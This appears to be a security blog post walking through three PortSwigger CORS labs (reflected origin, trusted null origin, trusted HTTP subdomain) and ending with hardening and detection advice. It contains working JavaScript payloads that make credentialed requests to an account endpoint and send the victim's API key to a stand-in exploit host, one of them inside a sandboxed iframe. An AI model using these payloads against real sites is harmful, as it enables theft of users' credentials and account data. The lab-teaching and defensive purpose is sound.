---
layout: post
title: "CORS Is Not Authorization - A Three-Lab Map"
date: 2026-06-16 09:30:00 +0800
categories: [web-security, methodology, detection-engineering]
tags: [cors, portswigger, browser-security, origin, subdomain-takeover]
related_posts:
  - dom-bugs-live-in-the-browser-runtime
  - xss-is-a-parser-boundary-problem
  - csrf-is-a-state-transition-bug
---

CORS is often described as a way to "allow another site to access an API." That is true, but the dangerous part is easy to blur.

**CORS is not authorization.** It only tells the browser whether a given origin may read a cross-origin response. If a sensitive endpoint reflects attacker-controlled origins and allows credentials, the victim's browser can hand private API responses to an attacker page.

The three PortSwigger CORS labs are a small but useful map.

## The map

| Lab | Broken trust | Impact |
|-----|--------------|--------|
| origin reflection | arbitrary `Origin` becomes ACAO | attacker page reads `/accountDetails` |
| trusted null origin | `Origin: null` is allowed | sandboxed iframe reads account details |
| trusted insecure protocols | HTTP subdomain is trusted | XSS on `http://stock.LAB` reads HTTPS main-site data |

## Origin reflection is the obvious failure

The sensitive endpoint is `/accountDetails`, which returns the user's API key. It also allows credentials:

```http
Access-Control-Allow-Credentials: true
```

When the server reflects an arbitrary origin:

```http
Origin: https://example.com
Access-Control-Allow-Origin: https://example.com
```

any attacker-controlled page can make a credentialed XHR:

```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
  location = '/log?key=' + encodeURIComponent(this.responseText);
};
req.open('GET', 'https://LAB/accountDetails', true);
req.withCredentials = true;
req.send();
</script>
```

The browser includes the victim session cookie, reads the response because CORS allows it, and sends the JSON to the exploit log.

## Null origin is still an origin decision

Some browser contexts produce:

```http
Origin: null
```

The second lab trusts that value. A sandboxed iframe is enough:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = function() {
  location = 'https://EXPLOIT/log?key=' + encodeURIComponent(this.responseText);
};
req.open('GET', 'https://LAB/accountDetails', true);
req.withCredentials = true;
req.send();
</script>"></iframe>
```

The lesson is simple: `null` does not mean "safe." It means the browser cannot serialize a normal origin. For sensitive responses, that should normally fail closed.

## Trusting subdomains turns XSS into data access

The third lab trusts HTTP subdomains:

```http
Origin: http://stock.LAB.web-security-academy.net
```

The stock subdomain has a reflected XSS in `productId`. The exploit navigates the victim to the HTTP stock origin, injects script there, and performs a credentialed XHR to the HTTPS main site:

```js
var req = new XMLHttpRequest();
req.onload = function() {
  location = 'https://EXPLOIT/log?key=' + this.responseText;
};
req.open('GET', 'https://LAB/accountDetails', true);
req.withCredentials = true;
req.send();
```

This is the composition risk. A subdomain bug becomes a main-site data leak because the main site's CORS policy treats that subdomain as trusted.

Scheme matters too. `http://stock.example` and `https://example` are different origins with very different transport guarantees.

## Defender notes

CORS should answer one narrow question: which exact browser origins may read this response?

Hardening:

- use a fixed allowlist of exact origins;
- compare scheme, host, and port;
- avoid credentialed CORS for sensitive APIs unless strictly required;
- reject `Origin: null` for sensitive responses;
- avoid wildcard subdomain trust;
- never trust HTTP origins for HTTPS sensitive APIs;
- keep normal authentication and authorization on the API itself;
- fix sibling and subdomain XSS because it can abuse site-level trust.

Detection:

- sensitive endpoints returning both `Access-Control-Allow-Credentials: true` and dynamic `Access-Control-Allow-Origin`;
- ACAO values containing unknown origins, `null`, or HTTP subdomains;
- account APIs requested with abnormal `Origin` values;
- exploit or external logs receiving account JSON or API-key-shaped data;
- HTTP subdomain pages making credentialed XHR requests to HTTPS account APIs.

The durable rule is that CORS is a read permission for browser JavaScript. Treat it like a data-exposure boundary, not a convenience header.
